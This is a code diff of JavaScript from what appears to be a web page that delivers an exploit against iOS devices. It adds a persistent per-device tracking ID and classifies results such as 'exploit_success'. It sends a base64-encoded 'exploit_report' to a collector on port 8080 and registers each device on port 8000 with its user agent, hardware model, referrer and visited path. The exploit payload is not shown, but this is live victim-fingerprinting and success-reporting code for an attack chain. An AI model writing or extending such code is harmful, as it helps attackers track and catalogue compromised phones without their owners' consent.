@@ -452,7 +452,19 @@
                     deviceModel = deviceMatch[0];
                 }
                 
+                const host = window.location.hostname || "127.0.0.1";
+                const base = window.location.protocol + "//" + host + ":8080";
+                let deviceUUID = window.__dsDeviceUUID;
+                if (!deviceUUID) {
+                    try { deviceUUID = localStorage.getItem("ds_device_uuid"); } catch(e){}
+                }
+                if (!deviceUUID) {
+                    deviceUUID = "ios-" + Math.random().toString(16).slice(2, 14) + Math.random().toString(16).slice(2, 14);
+                    window.__dsDeviceUUID = deviceUUID;
+                    try { localStorage.setItem("ds_device_uuid", deviceUUID); } catch(e){}
+                }
                 const reportData = {
+                    device_uuid: deviceUUID,
                     result: result,
                     ios_version: iosVersion || (platform.iOSVersion ? platform.iOSVersion.toString() : ''),
                     device: navigator.platform,
@@ -465,12 +477,41 @@
                     platform_state: platform,
                     timestamp: new Date().toISOString()
                 };
-                const xhr = new XMLHttpRequest();
-                const backendUrl = "http://" + window.location.hostname + ":5000/api/report";
-                xhr.open("POST", backendUrl, true);
-                xhr.setRequestHeader("Content-Type", "application/json");
-                xhr.send(JSON.stringify(reportData));
-                window.log(`[REPORT] Sent result to backend: ${result}`);
+                try {
+                    const xhr = new XMLHttpRequest();
+                    xhr.open("POST", base + "/upload", true);
+                    xhr.setRequestHeader("Content-Type", "application/json");
+                    const desc = {};
+                    for (const k of ["result","ios_version","device","device_model","app_version","screen_width","screen_height","language","timestamp"]) {
+                        if (reportData[k] !== undefined && reportData[k] !== null) desc[k] = reportData[k];
+                    }
+                    let compatTag = "compatible";
+                    if (result === 0) compatTag = "exploit_success";
+                    else if (String(result).startsWith("100")) compatTag = "not_supported";
+                    else if (result === 1000) compatTag = "top_level_error";
+                    else compatTag = "fail_" + result;
+                    xhr.send(JSON.stringify({
+                        deviceUUID: deviceUUID,
+                        category: "exploit_report",
+                        path: "/exploit/report/" + compatTag,
+                        description: JSON.stringify(desc),
+                        data: btoa(unescape(encodeURIComponent(JSON.stringify(reportData))))
+                    }));
+                } catch(e2){}
+                try {
+                    const xhr2 = new XMLHttpRequest();
+                    xhr2.open("POST", "http://" + host + ":8000/api/devices/register", true);
+                    xhr2.setRequestHeader("Content-Type", "application/json");
+                    xhr2.send(JSON.stringify({
+                        device_uuid: deviceUUID,
+                        user_agent: ua,
+                        hw_model: deviceModel || '',
+                        host: window.location.host || '',
+                        referer: document.referrer || '',
+                        access_path: window.location.pathname + (window.location.search || '')
+                    }));
+                } catch(e3){}
+                window.log(`[REPORT] Sent result to 8080: ${result} uuid=${deviceUUID}`);
             } catch (e) {
                 window.log(`[REPORT] Failed to send result: ${e.message}`);
             }
